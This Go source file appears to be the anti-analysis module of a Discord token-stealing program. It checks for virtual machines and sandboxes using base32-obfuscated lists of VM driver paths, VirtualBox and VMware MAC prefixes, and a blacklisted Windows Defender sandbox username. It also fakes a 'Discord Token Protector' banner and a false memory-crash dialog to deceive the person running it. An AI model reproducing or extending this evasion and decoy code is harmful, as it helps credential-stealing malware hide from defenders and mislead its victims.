package avm

import (
	"errors"
	"fmt"
	"grbreDsrc/protection"
	"net"
	"os"
	"os/exec"
	"strings"
)

func checkFileExists(filePath string) bool {
	_, error := os.Stat(filePath)
	//return !os.IsNotExist(err)
	return !errors.Is(error, os.ErrNotExist)
}
func VPCFILE() (bool, string) {
	generalPath := []string{
		`MM5FY5DBNNSV643DOJSWK3TTNBXXILTQOMYQ====`,
		`MM5FY3DPMFSGI3DMFZSXQZI=`,
		`MM5FY43ZNVRG63DTLRQWCZ3NNVRS44DEMI======`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVY4DSNRSXI2BOON4XG===`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVY4DSNRTHGLTTPFZQ====`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVY4DSNRWW65LTMUXHG6LT`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVY4DSNR3GSZDFN4XHG6LT`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVY4DSNR2GS3LFFZZXS4Y=`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVY4DSNRPXA5RTGIXHG6LT`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVY4DSNRPXAYLSMF3GS4TUL4ZTELTTPFZQ====`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVYVSCN54E233VONSS443ZOM======`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVYVSCN54EO5LFON2C443ZOM======`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVYVSCN54FGRROON4XG===`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVYVSCN54FM2LEMVXS443ZOM======`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4OZRG66DENFZXALTENRWA====`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4OZRG66DIN5XWWLTENRWA====`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4OZRG66DNOJ4G44BOMRWGY===`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4OZRG66DPM5WC4ZDMNQ======`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4OZRG66DPM5WGC4TSMF4XG4DVFZSGY3A=`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4OZRG66DPM5WGG4TVORUWYLTENRWA====`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4OZRG66DPM5WGK4TSN5ZHG4DVFZSGY3A=`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4OZRG66DPM5WGMZLFMRRGCY3LONYHKLTENRWA====`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4OZRG66DPM5WHAYLDNNZXA5JOMRWGY===`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4OZRG66DPM5WHAYLTON2GQ4TPOVTWQ43QOUXGI3DM`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4OZRG66DTMVZHM2LDMUXGK6DF`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4OZRG66DUOJQXSLTFPBSQ====`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4KZBG66CDN5XHI4TPNQXGK6DF`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVY5TNNVXXK43FFZZXS4Y=`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVY5TNNZSXILTTPFZQ====`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVY5TNPBXGK5BOON4XG===`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVY5TNNBTWM4ZOON4XG===`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVY5TNPA4DMLTTPFZQ====`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVY2DHMZZS443ZOM======`,
		`MM5FY53JNZSG653TLRZXS43UMVWTGMS4MRZGS5TFOJZVY5TNONZHMYZOON4XG===`,
		`IQ5FYXCUN5XWY4Y=`,
		`IQ5FYXCPKMZA====`,
		`IQ5FYXCOKQZVQ===`,
	}

	MAC := []string{
		"GAYDUMKDHI2DE===",
		"GA4DUMBQHIZDO===",
		"GAYDUMBVHI3DS===",
		"GAYDUMCDHIZDS===",
		"GAYDUMKDHIYTI===",
		"GAYDUNJQHI2TM===",
		"GAYDUMJWHJCTG===",
		"GAYDUMBQHIYDAORQGA======",
		"GAYDUMRTHI2DK===",
		"GQZDUMBRHIYGC===",
		"GAYDUMJVHI2WIORQGA======",
	}

	BLNAME := []string{
		"LRLUIQKHKV2GS3DJOR4UCY3DN52W45A=",
	}

	for _, nm := range BLNAME {
		if os.Getenv("USERNAME") == nm {
			return true, nm
		}
	}

	netInterfaces, err := net.Interfaces()
	if err != nil {
		return false, ""
	}

	for _, netInterface := range netInterfaces {
		for _, mac := range MAC {
			//decode mac address
			newmac := protection.Read(mac)
			fmt.Println(newmac)

			if strings.Contains(netInterface.HardwareAddr.String(), newmac) {
				return true, ""
			}
		}
	}

	allPath := [][]string{generalPath}

	for _, paths := range allPath {
		for _, p := range paths {
			newpath := protection.Read(p)

			if err != nil {
				fmt.Println(err)
			}

			if checkFileExists(newpath) {
				return true, newpath
			}
		}
	}

	return false, "none"
}

func ScrCl() {
	fmt.Println(" Discord Token Protector")
	fmt.Println("|----------------------")
	fmt.Println("|")
	fmt.Println("|")
	fmt.Println("|-Author : wyene")
	var buf string
	fmt.Scan(&buf)

	exec.Command("cmd", "/c", "start", "C:\\Windows\\System32\\cmd.exe", "/c", "msg", "*", `This instruction at 0xc0000020 referenced memory at 0x000000000. The memory could not be read. Click on OK to terminate the program`).Run()
	os.Exit(0)
}
